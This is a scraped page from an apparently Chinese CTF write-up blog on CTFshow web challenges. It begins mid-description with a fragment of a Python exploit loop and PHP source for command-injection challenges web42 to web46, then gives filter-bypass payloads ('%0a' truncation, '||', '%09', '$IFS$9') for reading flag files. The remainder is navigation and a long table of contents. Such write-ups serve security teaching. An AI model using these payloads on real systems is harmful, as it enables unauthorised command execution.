t=f.readline() 21 if t==\"\": 22 break 23 if t[0]==i: 24 #print(i) 25 s1+=t[2:5] 26 s2+=t[6:9] 27 break 28 f.close() 29 output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\" 30 return(output) 31 32while True: 33 param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\")) 34 data={ 35 'c':urllib.parse.unquote(param) 36 } 37 r=requests.post(url,data=data) 38 print(\"\\n[*] result:\\n\"+r.text) 将两个文件放在同一个文件夹，运行exp.py即可\n羽师傅nb\n注意链接要用http不能用https\nweb42 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 20:51:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET['c'])){ 16 $c=$_GET['c']; 17 system($c.\" \u003e/dev/null 2\u003e\u00261\"); 18}else{ 19 highlight_file(__FILE__); 20} 这道题会将我们输入的命令与\" \u003e/dev/null 2\u003e\u00261\"进行拼接\n/dev/null 2\u003e\u00261 意思是将标准输出和标准错误都重定向到 /dev/null 即不回显\n导致我们无法成功执行\n我们可以通过%0a截断的方式绕过\ntac fl*%0a\nor\n; //分号 | //只执行后面那条命令 || //只执行前面那条命令 \u0026 //两条命令都会执行 \u0026\u0026 //两条命令都会执行\n过滤了分号和cat，可以用||和\u0026来代替分号，tac代替cat\n可构造playload: url/?c=tac flag.php|| url/?c=tac flag.php%26 注意，这里的\u0026需要url编码\nweb43 过滤了cat、；，\n不是很影响\ntac fl*%0a or tac flag.php|| ... //记得转url编码 web44 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:32:01 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET['c'])){ 16 $c=$_GET['c']; 17 if(!preg_match(\"/;|cat|flag/i\", $c)){ 18 system($c.\" \u003e/dev/null 2\u003e\u00261\"); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了;|cat|flag\n小问题\ntac fl*%0a or tac f*|| ... //记得转url编码 web45 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 21:35:34 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET['c'])){ 16 $c=$_GET['c']; 17 if(!preg_match(\"/\\;|cat|flag| /i\", $c)){ 18 system($c.\" \u003e/dev/null 2\u003e\u00261\"); 19 } 20}else{ 21 highlight_file(__FILE__); 22} 过滤了;|cat|flag和空格\n可以用%09或$IFS$9代替空格\ntac%09fl*%0a or tac%09f*|| or echo$IFS`tac$IFS*`%0A ... //记得转url编码 web46 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:50:19 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } 过滤有点多啊\n;|cat|flag| |[0-9]|\\$|*\n但是事实上我们上题使用的方法并不会受到影响，因为%09是url编码，不会被当成数字过滤\ntac%09fl*%0a or tac%09f*|| or tac",
  "wordCount" : "57490",
  "inLanguage": "zh",
  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-02-20T00:15:50+08:00",
  "dateModified": "2025-02-20T00:15:50+08:00",
  "author":{
    "@type": "Person",
    "name": "Sonny Calcr"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/post/ctfshow_web/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Xrntkk's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
                    <span>首页</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/categories/" title="Categories">
                    <span>分类</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="搜索">
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Ctfshow sql篇
      <span class="entry-hint" title="Draft">
        <svg xmlns="http://www.w3.org/2000/svg" height="35" viewBox="0 -960 960 960" fill="currentColor">
          <path
            d="M160-410v-60h300v60H160Zm0-165v-60h470v60H160Zm0-165v-60h470v60H160Zm360 580v-123l221-220q9-9 20-13t22-4q12 0 23 4.5t20 13.5l37 37q9 9 13 20t4 22q0 11-4.5 22.5T862.09-380L643-160H520Zm300-263-37-37 37 37ZM580-220h38l121-122-18-19-19-18-122 121v38Zm141-141-19-18 37 37-18-19Z" />
        </svg>
      </span>
    </h1>
    <div class="post-meta"><span title='2025-02-20 00:15:50 +0800 CST'>2025-02-20</span>&nbsp;·&nbsp;115 分钟&nbsp;·&nbsp;Sonny Calcr

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#ctfshow_web" aria-label="CTFshow_Web">CTFshow_Web</a><ul>
                        <ul>
                        
                <li>
                    <a href="#%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%ae%8c%e5%b7%a5" aria-label="信息收集：（完工）">信息收集：（完工）</a><ul>
                        
                <li>
                    <a href="#web-1-5" aria-label="Web 1-5">Web 1-5</a></li>
                <li>
                    <a href="#web6" aria-label="Web6">Web6</a></li>
                <li>
                    <a href="#web7" aria-label="web7">web7</a></li>
                <li>
                    <a href="#web8" aria-label="web8">web8</a></li>
                <li>
                    <a href="#web9" aria-label="web9">web9</a></li>
                <li>
                    <a href="#web10" aria-label="web10">web10</a></li>
                <li>
                    <a href="#web11" aria-label="web11">web11</a></li>
                <li>
                    <a href="#web12" aria-label="web12">web12</a></li>
                <li>
                    <a href="#web13" aria-label="web13">web13</a></li>
                <li>
                    <a href="#web14" aria-label="web14">web14</a></li>
                <li>
                    <a href="#web15" aria-label="web15">web15</a></li>
                <li>
                    <a href="#web16" aria-label="Web16">Web16</a></li>
                <li>
                    <a href="#web17" aria-label="web17">web17</a></li>
                <li>
                    <a href="#web18" aria-label="web18">web18</a></li>
                <li>
                    <a href="#web19" aria-label="web19">web19</a></li>
                <li>
                    <a href="#web20" aria-label="web20">web20</a></li></ul>
                </li>
                <li>
                    <a href="#%e7%88%86%e7%a0%b4%e5%ae%8c%e5%b7%a5" aria-label="爆破：（完工）">爆破：（完工）</a><ul>
                        
                <li>
                    <a href="#web21" aria-label="web21">web21</a></li>
                <li>
                    <a href="#web22" aria-label="web22">web22</a></li>
                <li>
                    <a href="#web23" aria-label="web23">web23</a></li>
                <li>
                    <a href="#web24" aria-label="web24">web24</a></li>
                <li>
                    <a href="#web25" aria-label="web25">web25</a></li>
                <li>
                    <a href="#web26" aria-label="web26">web26</a></li>
                <li>
                    <a href="#web27" aria-label="web27">web27</a></li>
                <li>
                    <a href="#web28" aria-label="web28">web28</a></li></ul>
                </li>
                <li>
                    <a href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" aria-label="命令执行：">命令执行：</a><ul>
                        
                <li>
                    <a href="#web29" aria-label="web29">web29</a></li>
                <li>
                    <a href="#web30" aria-label="web30">web30</a></li>
                <li>
                    <a href="#web31" aria-label="web31">web31</a></li>
                <li>
                    <a href="#web32" aria-label="web32">web32</a></li>
                <li>
                    <a href="#web33" aria-label="web33">web33</a></li>
                <li>
                    <a href="#web34" aria-label="web34">web34</a></li>
                <li>
                    <a href="#web35" aria-label="web35">web35</a></li>
                <li>
                    <a href="#web36" aria-label="web36">web36</a></li>
                <li>
                    <a href="#web37" aria-label="web37">web37</a></li>
                <li>
                    <a href="#web38" aria-label="web38">web38</a></li>
                <li>
                    <a href="#web39" aria-label="web39">web39</a></li>
                <li>
                    <a href="#web40" aria-label="web40">web40</a></li>
                <li>
                    <a href="#web41" aria-label="web41">web41</a></li>
                <li>
                    <a href="#web42" aria-label="web42">web42</a></li>
                <li>
                    <a href="#web43" aria-label="web43">web43</a></li>
                <li>
                    <a href="#web44" aria-label="web44">web44</a></li>
                <li>
                    <a href="#web45" aria-label="web45">web45</a></li>
                <li>
                    <a href="#web46" aria-label="web46">web46</a></li>
                <li>
                    <a href="#web47" aria-label="web47">web47</a></li>
                <li>
                    <a href="#web48" aria-label="web48">web48</a></li>
                <li>
                    <a href="#web49" aria-label="web49">web49</a></li>
                <li>
                    <a href="#web50" aria-label="web50">web50</a></li>
                <li>
                    <a href="#web51" aria-label="web51">web51</a></li>
                <li>
                    <a href="#web51-1" aria-label="web51">web51</a></li>
                <li>
                    <a href="#web52" aria-label="web52">web52</a></li>
                <li>
                    <a href="#web54" aria-label="web54">web54</a></li>
                <li>
                    <a href="#web55" aria-label="web55">web55</a></li>
                <li>
                    <a href="#web56" aria-label="web56">web56</a></li>
                <li>
                    <a href="#web57" aria-label="web57">web57</a></li>
                <li>
                    <a href="#web58" aria-label="web58">web58</a></li>
                <li>
                    <a href="#web59" aria-label="web59">web59</a></li>
                <li>
                    <a href="#web60" aria-label="web60">web60</a></li>
                <li>
                    <a href="#web61" aria-label="web61">web61</a></li>
                <li>
                    <a href="#web62" aria-label="web62">web62</a></li>
                <li>
                    <a href="#web62-1" aria-label="web62">web62</a></li>
                <li>
                    <a href="#web63" aria-label="web63">web63</a></li>
                <li>
                    <a href="#web64" aria-label="web64">web64</a></li>
                <li>
                    <a href="#web65" aria-label="web65">web65</a></li>
                <li>
                    <a href="#web66" aria-label="web66">web66</a></li>
                <li>
                    <a href="#web67" aria-label="web67">web67</a></li>
                <li>
                    <a href="#web68" aria-label="web68">web68</a></li>
                <li>
                    <a href="#web69" aria-label="web69">web69</a></li>
                <li>
                    <a href="#web70" aria-label="web70">web70</a></li>
                <li>
                    <a href="#web71" aria-label="web71">web71</a></li>
                <li>
                    <a href="#web72" aria-label="web72">web72</a><ul>
                        
                <li>
                    <a href="#%e6%89%80%e4%bb%a5%e4%bb%80%e4%b9%88%e6%98%afuaf%e5%91%a2" aria-label="所以什么是uaf呢？">所以什么是uaf呢？</a></li></ul>
                </li>
                <li>
                    <a href="#web73" aria-label="web73">web73</a></li>
                <li>
                    <a href="#web74" aria-label="web74">web74</a></li>
                <li>
                    <a href="#web75" aria-label="web75">web75</a></li>
                <li>
                    <a href="#%e7%bb%93%e6%9e%9c%e8%be%93%e5%87%ba%e4%b8%8e%e8%b5%84%e6%ba%90%e9%87%8a%e6%94%be" aria-label="结果输出与资源释放">结果输出与资源释放</a></li>
                <li>
                    <a href="#%e5%bc%82%e5%b8%b8%e5%a4%84%e7%90%86" aria-label="异常处理">异常处理</a></li>
                <li>
                    <a href="#web76" aria-label="web76">web76</a></li>
                <li>
                    <a href="#web77" aria-label="web77">web77</a><ul>
                        
                <li>
                    <a href="#%e4%bb%80%e4%b9%88%e6%98%afffi" aria-label="什么是FFI?">什么是FFI?</a></li></ul>
                </li>
                <li>
                    <a href="#web118" aria-label="web118">web118</a></li>
                <li>
                    <a href="#web119" aria-label="Web119">Web119</a></li>
                <li>
                    <a href="#web120" aria-label="web120">web120</a></li>
                <li>
                    <a href="#web121" aria-label="web121">web121</a></li>
                <li>
                    <a href="#web122" aria-label="web122">web122</a></li>
                <li>
                    <a href="#web124" aria-label="web124">web124</a></li></ul>
                </li>
                <li>
                    <a href="#%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" aria-label="文件包含">文件包含</a><ul>
                        
                <li>
                    <a href="#web78" aria-label="Web78">Web78</a></li>
                <li>
                    <a href="#web79" aria-label="web79">web79</a></li>
                <li>
                    <a href="#web80" aria-label="web80">web80</a></li>
                <li>
                    <a href="#web81" aria-label="web81">web81</a></li>
                <li>
                    <a href="#web83" aria-label="web83">web83</a></li>
                <li>
                    <a href="#web84" aria-label="web84">web84</a></li>
                <li>
                    <a href="#web85" aria-label="web85">web85</a></li>
                <li>
                    <a href="#web86" aria-label="web86">web86</a></li>
                <li>
                    <a href="#web87" aria-label="web87">web87</a><ul>
                        
                <li>
                    <a href="#phpfilter%e7%9a%84%e4%bd%bf%e7%94%a8" aria-label="php://filter的使用">php://filter的使用</a></li></ul>
                </li>
                <li>
                    <a href="#web88" aria-label="web88">web88</a></li>
                <li>
                    <a href="#web116" aria-label="web116">web116</a></li>
                <li>
                    <a href="#web117" aria-label="web117">web117</a></li></ul>
                </li>
                <li>
                    <a href="#php%e7%89%b9%e6%80%a7" aria-label="php特性">php特性</a><ul>
                        
                <li>
                    <a href="#web89" aria-label="web89">web89</a><ul>
                        
                <li>
                    <a href="#preg_match%e5%87%bd%e6%95%b0" aria-label="preg_match函数：">preg_match函数：</a></li>
                <li>
                    <a href="#intval%e5%87%bd%e6%95%b0" aria-label="intval函数:">intval函数:</a></li></ul>
                </li>
                <li>
                    <a href="#web90" aria-label="web90">web90</a></li>
                <li>
                    <a href="#web91" aria-label="web91">web91</a><ul>
                        
                <li>
                    <a href="#phpim-%e7%9a%84%e5%90%ab%e4%b9%89" aria-label="/^php$/im 的含义">/^php$/im 的含义</a></li></ul>
                </li>
                <li>
                    <a href="#web92" aria-label="web92">web92</a></li>
                <li>
                    <a href="#web93" aria-label="web93">web93</a></li>
                <li>
                    <a href="#web94" aria-label="web94">web94</a><ul>
                        
                <li>
                    <a href="#strops%e5%87%bd%e6%95%b0%e7%bb%95%e8%bf%87" aria-label="strops函数绕过：">strops函数绕过：</a></li></ul>
                </li>
                <li>
                    <a href="#web95" aria-label="web95">web95</a></li>
                <li>
                    <a href="#web96" aria-label="web96">web96</a></li>
                <li>
                    <a href="#web97" aria-label="web97">web97</a></li>
                <li>
                    <a href="#web98" aria-label="web98">web98</a></li>
                <li>
                    <a href="#web99" aria-label="web99">web99</a></li>
                <li>
                    <a href="#web100" aria-label="web100">web100</a></li>
                <li>
                    <a href="#web101" aria-label="web101">web101</a></li>
                <li>
                    <a href="#web102" aria-label="web102">web102</a></li>
                <li>
                    <a href="#web103" aria-label="web103">web103</a></li>
                <li>
                    <a href="#web104" aria-label="web104">web104</a></li>
                <li>
                    <a href="#web105" aria-label="web105">web105</a></li>
                <li>
                    <a href="#web106" aria-label="web106">web106</a></li>
                <li>
                    <a href="#web107" aria-label="web107">web107</a></li>
                <li>
                    <a href="#web108" aria-label="web108">web108</a></li>
                <li>
                    <a href="#web109" aria-label="web109">web109</a></li>
                <li>
                    <a href="#web110" aria-label="web110">web110</a></li>
                <li>
                    <a href="#web111" aria-label="web111">web111</a></li>
                <li>
                    <a href="#web112" aria-label="web112">web112</a></li>
                <li>
                    <a href="#web113" aria-label="web113">web113</a></li>
                <li>
                    <a href="#web114" aria-label="web114">web114</a></li>
                <li>
                    <a href="#web115" aria-label="web115">web115</a></li>
                <li>
                    <a href="#web123" aria-label="web123">web123</a></li>
                <li>
                    <a href="#web125" aria-label="web125">web125</a></li>
                <li>
                    <a href="#web126" aria-label="web126">web126</a></li>
                <li>
                    <a href="#web127" aria-label="web127">web127</a></li>
                <li>
                    <a href="#web128" aria-label="web128">web128</a></li>
                <li>
                    <a href="#web129" aria-label="web129">web129</a></li>
                <li>
                    <a href="#web130" aria-label="web130">web130</a></li>
                <li>
                    <a href="#web131" aria-label="web131">web131</a></li>
                <li>
                    <a href="#web132" aria-label="web132">web132</a></li>
                <li>
                    <a href="#web133" aria-label="web133">web133</a></li>
                <li>
                    <a href="#web134" aria-label="web134">web134</a></li>
                <li>
                    <a href="#web135" aria-label="web135">web135</a></li>
                <li>
                    <a href="#web136" aria-label="web136">web136</a></li></ul>
                </li>
                <li>
                    <a href="#linux-tee%e5%91%bd%e4%bb%a4%e4%bb%8b%e7%bb%8d" aria-label="Linux tee命令介绍">Linux tee命令介绍</a><ul>
                        
                <li>
                    <a href="#web137" aria-label="web137">web137</a></li>
                <li>
                    <a href="#web138" aria-label="web138">web138</a></li>
                <li>
                    <a href="#web139" aria-label="web139">web139</a></li>
                <li>
                    <a href="#web140" aria-label="web140">web140</a></li>
                <li>
                    <a href="#web141" aria-label="web141">web141</a></li>
                <li>
                    <a href="#web142" aria-label="web142">web142</a></li>
                <li>
                    <a href="#web143" aria-label="web143">web143</a></li>
                <li>
                    <a href="#web144" aria-label="web144">web144</a></li>
                <li>
                    <a href="#web145" aria-label="web145">web145</a></li>
                <li>
                    <a href="#web146" aria-label="web146">web146</a></li>
                <li>
                    <a href="#web147" aria-label="web147">web147</a></li>
                <li>
                    <a href="#web148" aria-label="web148">web148</a></li>
                <li>
                    <a href="#web149" aria-label="web149">web149</a></li>
                <li>
                    <a href="#web150" aria-label="web150">web150</a></li>
                <li>
                    <a href="#web150plus" aria-label="web150plus">web150plus</a></li></ul>
                </li>
                <li>
                    <a href="#%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" aria-label="文件上传">文件上传</a><ul>
                        
                <li>
                    <a href="#web151" aria-label="web151">web151</a></li>
                <li>
                    <a href="#web152" aria-label="web152">web152</a></li>
                <li>
                    <a href="#web153" aria-label="web153">web153</a></li>
                <li>
                    <a href="#web154" aria-label="web154">web154</a></li>
                <li>
                    <a href="#web155" aria-label="web155">web155</a></li>
                <li>
                    <a href="#web156" aria-label="web156">web156</a></li>
                <li>
                    <a href="#web157" aria-label="web157">web157</a></li>
                <li>
                    <a href="#web158" aria-label="web158">web158</a></li>
                <li>
                    <a href="#web159" aria-label="web159">web159</a></li>
                <li>
                    <a href="#web160" aria-label="web160">web160</a></li>
                <li>
                    <a href="#web161" aria-label="web161">web161</a></li>
                <li>
                    <a href="#web162" aria-label="web162">web162</a></li>
                <li>
                    <a href="#web163" aria-label="web163">web163</a></li>
                <li>
                    <a href="#web164" aria-label="web164">web164</a></li>
                <li>
                    <a href="#web165" aria-label="web165">web165</a></li>
                <li>
                    <a href="#web166" aria-label="web166">web166</a></li>
                <li>
                    <a href="#web167" aria-label="web167">web167</a></li>
                <li>
                    <a href="#web168" aria-label="web168">web168</a></li>
                <li>
                    <a href="#web169" aria-label="web169">web169</a></li>
                <li>
                    <a href="#web170" aria-label="web170">web170</a></li></ul>
                </li>
                <li>
                    <a href="#sql%e6%b3%a8%e5%85%a5" aria-label="sql注入">sql注入</a><ul>
                        
                <li>
                    <a href="#%e6%97%a0%e8%bf%87%e6%bb%a4%e6%b3%a8%e5%85%a5%e5%af%b9%e8%be%93%e5%87%ba%e5%86%85%e5%ae%b9%e8%bf%9b%e8%a1%8c%e8%bf%87%e6%bb%a4" aria-label="无过滤注入（对输出内容进行过滤）">无过滤注入（对输出内容进行过滤）</a></li>
                <li>
                    <a href="#web171" aria-label="web171">web171</a></li>
                <li>
                    <a href="#web172" aria-label="web172">web172</a></li>
                <li>
                    <a href="#web173" aria-label="web173">web173</a></li>
                <li>
                    <a href="#web174" aria-label="web174">web174</a></li>
                <li>
                    <a href="#web175" aria-label="web175">web175</a></li>
                <li>
                    <a href="#%e8%bf%87%e6%bb%a4%e6%b3%a8%e5%85%a5%e5%af%b9%e4%bc%a0%e5%85%a5%e5%8f%82%e6%95%b0%e8%bf%9b%e8%a1%8c%e8%bf%87%e6%bb%a4" aria-label="过滤注入（对传入参数进行过滤）">过滤注入（对传入参数进行过滤）</a></li>
                <li>
                    <a href="#web176" aria-label="web176">web176</a></li>
                <li>
                    <a href="#web177" aria-label="web177">web177</a></li>
                <li>
                    <a href="#web178" aria-label="web178">web178</a></li>
                <li>
                    <a href="#web179" aria-label="web179">web179</a></li>
                <li>
                    <a href="#web180" aria-label="web180">web180</a></li>
                <li>
                    <a href="#web181" aria-label="web181">web181</a></li>
                <li>
                    <a href="#web182" aria-label="web182">web182</a></li>
                <li>
                    <a href="#web183" aria-label="web183">web183</a></li>
                <li>
                    <a href="#web184" aria-label="web184">web184</a></li>
                <li>
                    <a href="#web185" aria-label="web185">web185</a></li>
                <li>
                    <a href="#web186" aria-label="web186">web186</a></li>
                <li>
                    <a href="#web187" aria-label="web187">web187</a></li>
                <li>
                    <a href="#web188" aria-label="web188">web188</a></li>
                <li>
                    <a href="#web189" aria-label="web189">web189</a></li>
                <li>
                    <a href="#web190" aria-label="web190">web190</a></li>
                <li>
                    <a href="#web191" aria-label="web191">web191</a></li>
                <li>
                    <a href="#web192" aria-label="web192">web192</a></li>
                <li>
                    <a href="#web193" aria-label="web193">web193</a></li>
                <li>
                    <a href="#web194" aria-label="web194">web194</a></li>
                <li>
                    <a href="#web195" aria-label="web195">web195</a></li>
                <li>
                    <a href="#web196" aria-label="web196">web196</a></li>
                <li>
                    <a href="#web197" aria-label="web197">web197</a></li>
                <li>
                    <a href="#web198" aria-label="web198">web198</a></li>
                <li>
                    <a href="#web199" aria-label="web199">web199</a></li>
                <li>
                    <a href="#web200" aria-label="web200">web200</a></li>
                <li>
                    <a href="#web190-web200%e9%80%9a%e8%a7%a3" aria-label="web190-web200通解">web190-web200通解</a></li>
                <li>
                    <a href="#sqlmap%e7%9a%84%e4%bd%bf%e7%94%a8" aria-label="sqlmap的使用">sqlmap的使用</a></li>
                <li>
                    <a href="#web201" aria-label="web201">web201</a></li>
                <li>
                    <a href="#web202" aria-label="web202">web202</a></li>
                <li>
                    <a href="#web203" aria-label="web203">web203</a></li>
                <li>
                    <a href="#web204" aria-label="web204">web204</a></li>
                <li>
                    <a href="#web205" aria-label="web205">web205</a></li>
                <li>
                    <a href="#web206" aria-label="web206">web206</a></li>
                <li>
                    <a href="#web207" aria-label="web207">web207</a></li>
                <li>
                    <a href="#web208" aria-label="web208">web208</a></li>
                <li>
                    <a href="#web209" aria-label="web209">web209</a></li>
                <li>
                    <a href="#web210" aria-label="web210">web210</a></li>
                <li>
                    <a href="#web211" aria-label="web211">web211</a></li>
                <li>
                    <a href="#web212" aria-label="web212">web212</a></li>
                <li>
                    <a href="#web213" aria-label="web213">web213</a></li>
                <li>
                    <a href="#%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8" aria-label="时间盲注">时间盲注</a></li>
                <li>
                    <a href="#web214" aria-label="web214">web214</a></li>
                <li>
                    <a href="#web215" aria-label="web215">web215</a></li>
                <li>
                    <a href="#web216" aria-label="web216">web216</a></li>
                <li>
                    <a href="#web217" aria-label="web217">web217</a></li>
                <li>
                    <a href="#web218" aria-label="web218">web218</a></li>
                <li>
                    <a href="#web219" aria-label="web219">web219</a></li>
                <li>
                    <a href="#web220" aria-label="web220">web220</a></li>
                <li>
                    <a href="#web221" aria-label="web221">web221</a></li>
                <li>
                    <a href="#group%e6%b3%a8%e5%85%a5" aria-label="group注入">group注入</a></li>
                <li>
                    <a href="#web222" aria-label="web222">web222</a></li>
                <li>
                    <a href="#web223" aria-label="web223">web223</a></li>
                <li>
                    <a href="#web224" aria-label="web224">web224</a></li>
                <li>
                    <a href="#%e5%a0%86%e5%8f%a0%e6%b3%a8%e5%85%a5" aria-label="堆叠注入">堆叠注入</a></li>
                <li>
                    <a href="#web225" aria-label="web225">web225</a></li>
                <li>
                    <a href="#web226" aria-label="web226">web226</a></li>
                <li>
                    <a href="#web227" aria-label="web227">web227</a></li>
                <li>
                    <a href="#web228" aria-label="web228">web228</a></li>
                <li>
                    <a href="#web229" aria-label="web229">web229</a></li>
                <li>
                    <a href="#web230" aria-label="web230">web230</a></li>
                <li>
                    <a href="#update%e6%b3%a8%e5%85%a5" aria-label="update注入">update注入</a></li>
                <li>
                    <a href="#web231" aria-label="web231">web231</a></li>
                <li>
                    <a href="#web232" aria-label="web232">web232</a></li>
                <li>
                    <a href="#web233" aria-label="web233">web233</a><ul>
                        
                <li>
                    <a href="#%e6%96%b9%e6%b3%95%e4%b8%80" aria-label="方法一">方法一</a></li>
                <li>
                    <a href="#%e6%96%b9%e6%b3%95%e4%ba%8c-%e7%9b%b2%e6%b3%a8" aria-label="方法二 ：盲注">方法二 ：盲注</a></li></ul>
                </li>
                <li>
                    <a href="#web234" aria-label="web234">web234</a></li>
                <li>
                    <a href="#web235" aria-label="web235">web235</a></li>
                <li>
                    <a href="#web236" aria-label="web236">web236</a></li>
                <li>
                    <a href="#insert%e6%b3%a8%e5%85%a5" aria-label="insert注入">insert注入</a></li>
                <li>
                    <a href="#web237" aria-label="web237">web237</a></li>
                <li>
                    <a href="#web238" aria-label="web238">web238</a></li>
                <li>
                    <a href="#web239" aria-label="web239">web239</a></li>
                <li>
                    <a href="#web240" aria-label="web240">web240</a></li>
                <li>
                    <a href="#web241" aria-label="web241">web241</a></li>
                <li>
                    <a href="#%e6%96%87%e4%bb%b6%e6%b3%a8%e5%85%a5" aria-label="文件注入">文件注入</a></li>
                <li>
                    <a href="#web242" aria-label="web242">web242</a></li>
                <li>
                    <a href="#web243" aria-label="web243">web243</a></li>
                <li>
                    <a href="#%e6%8a%a5%e9%94%99%e6%b3%a8%e5%85%a5" aria-label="报错注入">报错注入</a></li>
                <li>
                    <a href="#web244" aria-label="web244">web244</a></li>
                <li>
                    <a href="#web245" aria-label="web245">web245</a></li>
                <li>
                    <a href="#web246" aria-label="web246">web246</a></li>
                <li>
                    <a href="#web247" aria-label="web247">web247</a></li>
                <li>
                    <a href="#web248" aria-label="web248">web248</a></li>
                <li>
                    <a href="#web249" aria-label="web249">web249</a></li>
                <li>
                    <a href="#web250" aria-label="web250">web250</a></li>
                <li>
                    <a href="#web251" aria-label="web251">web251</a></li>
                <li>
                    <a href="#web252" aria-label="web252">web252</a></li>
                <li>
                    <a href="#web253" aria-label="web253">web253</a><ul>
                        
                <li>
                    <a href="#%e6%96%b9%e6%b3%95%e4%b8%80-1" aria-label="方法一">方法一</a></li>
                <li>
                    <a href="#%e6%96%b9%e6%b3%95%e4%ba%8c" aria-label="方法二">方法二</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="反序列化">反序列化</a><ul>
                        
                <li>
                    <a href="#php%e7%9a%84%e9%ad%94%e6%b3%95%e6%96%b9%e6%b3%95" aria-label="PHP的魔法方法">PHP的魔法方法</a></li>
                <li>
                    <a href="#web254" aria-label="web254">web254</a></li>
                <li>
                    <a href="#web255" aria-label="web255">web255</a></li>
                <li>
                    <a href="#web256" aria-label="web256">web256</a></li>
                <li>
                    <a href="#web257" aria-label="web257">web257</a></li>
                <li>
                    <a href="#web258" aria-label="web258">web258</a></li>
                <li>
                    <a href="#web289" aria-label="web289">web289</a></li></ul>
                </li>
                <li>
                    <a href="#nodejs" aria-label="node.js">node.js</a><ul>
                        
                <li>
                    <a href="#web334" aria-label="web334">web334</a></li>
                <li>
                    <a href="#web335" aria-label="web335">web335</a></li>
                <li>
                    <a href="#web336" aria-label="web336">web336</a></li>
                <li>
                    <a href="#web337" aria-label="web337">web337</a></li></ul>
                </li>
                <li>
                    <a href="#ssrf" aria-label="SSRF">SSRF</a><ul>
                        
                <li>
                    <a href="#web351" aria-label="web351">web351</a></li>
                <li>
                    <a href="#web352" aria-label="web352">web352</a></li>
                <li>
                    <a href="#web353" aria-label="web353">web353</a></li>
                <li>
                    <a href="#web354" aria-label="web354">web354</a></li>
                <li>
                    <a href="#web355" aria-label="web355">web355</a></li>
                <li>
                    <a href="#web356" aria-label="web356">web356</a></li>
                <li>
                    <a href="#web357" aria-label="web357">web357</a></li></ul>
                </li>
                <li>
                    <a href="#ssti" aria-label="ssti">ssti</a><ul>
                        
                <li>
                    <a href="#web361" aria-label="web361">web361</a></li>
                <li>
